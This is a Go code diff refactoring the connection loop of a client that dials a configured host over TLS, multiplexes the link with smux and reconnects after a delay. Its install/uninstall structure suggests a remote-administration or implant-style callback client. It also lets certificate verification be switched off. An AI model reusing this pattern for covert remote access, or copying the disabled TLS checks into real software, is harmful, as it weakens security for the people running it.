@@ -44,39 +44,44 @@ func main() {
 		fmt.Println("Install failed:", err.Error())
 	}
 
-	start(Config)
+	for {
+		fmt.Println(connect(Config))
+		time.Sleep(time.Second * time.Duration(Config.Delay))
+	}
 }
 
-func start(config shared.BinaryConfig) {
-	for {
-		host := config.Host
-		fmt.Println("Connecting to", host)
+func connect(config shared.BinaryConfig) error {
+	host := config.Host
+	fmt.Println("Connecting to", host)
 
-		var err error
-		conn, err = tls.Dial("tcp", host, &tls.Config{
-			InsecureSkipVerify: Config.InvalidSSL,
-		})
-		session, err := smux.Client(conn, nil)
-		if err != nil {
-			panic(err)
-		}
-
-		con, err := NewConnection(session)
-		if err != nil {
-			panic(err)
-		}
-
-		//Transfers = make(TransfersMap)
-
-		go con.writeLoop()
-		go con.recvLoop()
-
-		con.Init()
-		<-con.die
-
-		con.Close()
-		time.Sleep(time.Second * time.Duration(config.Delay))
+	var err error
+	conn, err = tls.Dial("tcp", host, &tls.Config{
+		InsecureSkipVerify: Config.InvalidSSL,
+	})
+	if err != nil {
+		return err
 	}
+
+	session, err := smux.Client(conn, nil)
+	if err != nil {
+		return err
+	}
+
+	con, err := NewConnection(session)
+	if err != nil {
+		return err
+	}
+
+	go con.writeLoop()
+	go con.recvLoop()
+
+	time.Sleep(2 * time.Second)
+	con.Init()
+
+	err = <-con.err
+	con.Close()
+
+	return err
 }
 
 func Uninstall() {
